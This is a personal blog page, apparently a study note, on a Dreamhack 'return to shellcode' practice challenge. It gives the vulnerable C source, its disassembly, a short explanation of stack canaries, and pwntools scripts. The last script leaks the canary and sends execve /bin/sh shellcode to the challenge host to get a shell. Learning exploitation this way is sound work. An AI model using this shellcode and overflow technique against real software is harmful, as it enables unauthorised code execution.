@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>return to sellcode · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2;
+      margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag { background: var(--tag); border-radius: 4px; padding: .1rem .5rem; font-size: .72rem; color: var(--muted); }
+    .post-body { line-height: 1.85; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.4rem; font-weight: 400; margin: 2.2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.8rem 0 .5rem; }
+    .post-body h4 { font-size: .9rem; font-weight: 600; margin: 1.2rem 0 .4rem; color: var(--muted); }
+    .post-body p  { margin-bottom: 1rem; }
+    .post-body ul, .post-body ol { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .35rem; }
+    .post-body blockquote {
+      border-left: 3px solid var(--accent); margin: 1.2rem 0;
+      padding: .6rem 1rem; background: var(--tag); border-radius: 0 6px 6px 0;
+    }
+    .post-body blockquote p { margin: 0; color: var(--muted); font-style: italic; }
+    .post-body hr { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0;
+      border-radius: 6px; padding: 1.2rem;
+      overflow-x: auto; font-size: .82rem; margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code { background: var(--tag); border-radius: 3px; padding: .1rem .35rem; font-size: .85em; }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem; transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+</style>
+</head>
+<body>
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../papers.html">Papers</a></li>
+    <li><a href="../posts.html">Posts</a></li>
+    <li><a href="../blog.html">Blog</a></li>
+    <li><a href="../cv.html">CV</a></li>
+  </ul>
+</nav>
+<main class="page">
+  <a class="back-link" href="../posts.html">← Back to Posts</a>
+  <div class="post-header">
+    <h1>return to sellcode</h1>
+    <div class="post-meta">
+      <span>2026·04</span>
+      <span class="post-tag">Note</span>
+    </div>
+  </div>
+  <hr class="post-divider">
+  <div class="post-body">
+<h2>문제</h2>
+
+<p><strong>문제 설명</strong></p>
+
+<p>**Description</p>
+<p>Exploit Tech: Return to Shellcode에서 실습하는 문제입니다.**</p>
+
+<pre><code class="language-python">
+┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0410]
+└─$ cat r2s.c
+// Name: r2s.c
+// Compile: gcc -o r2s r2s.c -zexecstack
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+}
+
+int main() {
+  char buf[0x50];
+
+  init();
+
+  printf("Address of the buf: %p\n", buf);
+  printf("Distance between buf and $rbp: %ld\n",
+         (char*)__builtin_frame_address(0) - buf);
+
+  *printf*("[1] Leak the canary\n");
+  printf("Input: ");
+  fflush(stdout);
+
+  read(0, buf, 0x100);
+  printf("Your input is '%s'\n", buf);
+
+  puts("[2] Overwrite the return address");
+  printf("Input: ");
+  fflush(stdout);
+  gets(buf);
+
+  return 0;
+}
+</code></pre>
+
+<h2>해결</h2>
+
+<pre><code class="language-python">
+gef➤  disassemble main
+Dump of assembler code for function main:
+   0x00000000000008cd &lt;+0&gt;:     push   rbp
+   0x00000000000008ce &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000000008d1 &lt;+4&gt;:     sub    rsp,0x60
+   0x00000000000008d5 &lt;+8&gt;:     mov    rax,QWORD PTR fs:0x28
+   0x00000000000008de &lt;+17&gt;:    mov    QWORD PTR [rbp-0x8],rax
+   0x00000000000008e2 &lt;+21&gt;:    xor    eax,eax
+   0x00000000000008e4 &lt;+23&gt;:    mov    eax,0x0
+   0x00000000000008e9 &lt;+28&gt;:    call   0x88a &lt;init&gt;
+   0x00000000000008ee &lt;+33&gt;:    lea    rax,[rbp-0x60]
+   0x00000000000008f2 &lt;+37&gt;:    mov    rsi,rax
+   0x00000000000008f5 &lt;+40&gt;:    lea    rdi,[rip+0x16c]        # 0xa68
+   0x00000000000008fc &lt;+47&gt;:    mov    eax,0x0
+   0x0000000000000901 &lt;+52&gt;:    call   0x720 &lt;printf@plt&gt;
+   0x0000000000000906 &lt;+57&gt;:    mov    rax,rbp
+   0x0000000000000909 &lt;+60&gt;:    mov    rdx,rax
+   0x000000000000090c &lt;+63&gt;:    lea    rax,[rbp-0x60]
+   0x0000000000000910 &lt;+67&gt;:    sub    rdx,rax
+   0x0000000000000913 &lt;+70&gt;:    mov    rax,rdx
+   0x0000000000000916 &lt;+73&gt;:    mov    rsi,rax
+   0x0000000000000919 &lt;+76&gt;:    lea    rdi,[rip+0x160]        # 0xa80
+   0x0000000000000920 &lt;+83&gt;:    mov    eax,0x0
+   0x0000000000000925 &lt;+88&gt;:    call   0x720 &lt;printf@plt&gt;
+   0x000000000000092a &lt;+93&gt;:    lea    rdi,[rip+0x173]        # 0xaa4
+   0x0000000000000931 &lt;+100&gt;:   call   0x700 &lt;puts@plt&gt;
+   0x0000000000000936 &lt;+105&gt;:   lea    rdi,[rip+0x17b]        # 0xab8
+   0x000000000000093d &lt;+112&gt;:   mov    eax,0x0
+   0x0000000000000942 &lt;+117&gt;:   call   0x720 &lt;printf@plt&gt;
+   0x0000000000000947 &lt;+122&gt;:   mov    rax,QWORD PTR [rip+0x2006c2]        # 0x201010 &lt;stdout@@GLIBC_2.2.5&gt;
+   0x000000000000094e &lt;+129&gt;:   mov    rdi,rax
+   0x0000000000000951 &lt;+132&gt;:   call   0x750 &lt;fflush@plt&gt;
+   0x0000000000000956 &lt;+137&gt;:   lea    rax,[rbp-0x60]
+   0x000000000000095a &lt;+141&gt;:   mov    edx,0x100
+   0x000000000000095f &lt;+146&gt;:   mov    rsi,rax
+   0x0000000000000962 &lt;+149&gt;:   mov    edi,0x0
+   0x0000000000000967 &lt;+154&gt;:   call   0x730 &lt;read@plt&gt;
+   0x000000000000096c &lt;+159&gt;:   lea    rax,[rbp-0x60]
+   0x0000000000000970 &lt;+163&gt;:   mov    rsi,rax
+   0x0000000000000973 &lt;+166&gt;:   lea    rdi,[rip+0x146]        # 0xac0
+   0x000000000000097a &lt;+173&gt;:   mov    eax,0x0
+   0x000000000000097f &lt;+178&gt;:   call   0x720 &lt;printf@plt&gt;
+   0x0000000000000984 &lt;+183&gt;:   lea    rdi,[rip+0x14d]        # 0xad8
+   0x000000000000098b &lt;+190&gt;:   call   0x700 &lt;puts@plt&gt;
+   0x0000000000000990 &lt;+195&gt;:   lea    rdi,[rip+0x121]        # 0xab8
+   0x0000000000000997 &lt;+202&gt;:   mov    eax,0x0
+   0x000000000000099c &lt;+207&gt;:   call   0x720 &lt;printf@plt&gt;
+   0x00000000000009a1 &lt;+212&gt;:   mov    rax,QWORD PTR [rip+0x200668]        # 0x201010 &lt;stdout@@GLIBC_2.2.5&gt;
+   0x00000000000009a8 &lt;+219&gt;:   mov    rdi,rax
+   0x00000000000009ab &lt;+222&gt;:   call   0x750 &lt;fflush@plt&gt;
+   0x00000000000009b0 &lt;+227&gt;:   lea    rax,[rbp-0x60]
+   0x00000000000009b4 &lt;+231&gt;:   mov    rdi,rax
+   0x00000000000009b7 &lt;+234&gt;:   mov    eax,0x0
+   0x00000000000009bc &lt;+239&gt;:   call   0x740 &lt;gets@plt&gt;
+   0x00000000000009c1 &lt;+244&gt;:   mov    eax,0x0
+   0x00000000000009c6 &lt;+249&gt;:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x00000000000009ca &lt;+253&gt;:   xor    rcx,QWORD PTR fs:0x28
+   0x00000000000009d3 &lt;+262&gt;:   je     0x9da &lt;main+269&gt;
+   0x00000000000009d5 &lt;+264&gt;:   call   0x710 &lt;__stack_chk_fail@plt&gt;
+   0x00000000000009da &lt;+269&gt;:   leave
+   0x00000000000009db &lt;+270&gt;:   ret
+</code></pre>
+
+<p>python3 -c "print('A' * 88)" > input.txt</p>
+
+<h3>Stack Canary</h3>
+
+<p><img width="1042" height="444" alt="image" src="https://github.com/user-attachments/assets/1fa5627f-96c0-4c23-859f-3b0464b00505" /></p>
+
+
+<p>A stack canary is a security value placed in memory to detect buffer overflow attacks.</p>
+
+<h3>Typical Canary Structure</h3>
+
+<p>A common canary looks like:</p>
+
+<pre><code class="language-">
+0x00????????
+</code></pre>
+
+<p>Notice:</p>
+
+<ul>
+<li>It often <strong>starts with a NULL byte (<code>0x00</code>)</strong></li>
+</ul>
+
+<h3>Why?</h3>
+
+<p>Because many overflow functions (like <code>strcpy</code>) stop at <code>\0</code></p>
+
+<hr>
+
+<p>형준님이 알려준 플로우</p>
+
+<pre><code class="language-python">
+printf("Address of the buf: %p\n", buf);
+printf("Distance between buf and $rbp: %ld\n",
+       (char*)__builtin_frame_address(0) - buf);
+</code></pre>
+
+<p>→ buf 의 주소를 알려줌</p>
+
+<p>→ buf 와 rbp 사이의 주소 거리를 알려줌 = 96</p>
+
+<pre><code class="language-python">
+┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0410]
+└─$ ./r2s
+Address of the buf: 0x7ffcbddc6940
+Distance between buf and $rbp: 96
+[1] Leak the canary
+Input:
+</code></pre>
+
+<pre><code class="language-python">
+┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0410]
+└─$ ./r2s &lt; input.txt
+Address of the buf: 0x7ffcc2095220
+Distance between buf and $rbp: 96
+[1] Leak the canary
+Input: Your input is 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Q�nK�
+     ��S        ��'
+[2] Overwrite the return address
+Input: *** stack smashing detected ***: terminated
+Aborted                    ./r2s &lt; input.txt
+</code></pre>
+
+<p>→ input.txt 에 88 개의 A 를 적은 뒤 보낸 것.</p>
+
+<pre><code class="language-python">
+cat exploit.py
+from pwn import *
+
+ #p = remote("host3.dreamhack.games", 20179)
+
+# payload = p32(0x0804a0b0) + b"/bin/sh\x00"
+p = process("./r2s")
+
+payload = b"A" * 88
+
+p.sendafter(b"Input: ", payload)
+p.recvuntil(b"ut is '")
+p.recv(88)
+
+buf_addr = u64(p.recv(6).ljust(8, b"\x00"))
+log.info(f"Leaked buf_addr: {hex(buf_addr)}")
+
+p.interactive()
+</code></pre>
+
+<pre><code class="language-python">
+Leaked buf_addr: 0x205d325b0a27
+</code></pre>
+
+<pre><code class="language-python">
+from pwn import *
+
+context.arch = 'amd64'
+p = remote("host8.dreamhack.games", 17371)
+
+p.recvuntil(b"Address of the buf: ")
+buf_addr = int(p.recvline(), 16)
+
+p.recvuntil(b"Distance between buf and $rbp: ")
+dist_rbp = int(p.recvline()) 
+p.sendafter(b"Input: ", b"A" * (dist_rbp - 7))
+
+p.recvuntil(b"A" * (dist_rbp - 7))
+canary = u64(b"\x00" + p.recv(7)) 
+log.info(f"Canary: {hex(canary)}")
+
+shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
+
+payload = shellcode 
+payload += b"A" * (dist_rbp - 8 - len(shellcode)) 
+payload += p64(canary)                            
+payload += b"B" * 8                               
+payload += p64(buf_addr)                          
+
+p.sendlineafter(b"Input: ", payload)
+
+p.interactive()
+</code></pre>
+  </div>
+</main>
+<script src="../../js/nav.js"></script>
+</body>
+</html>
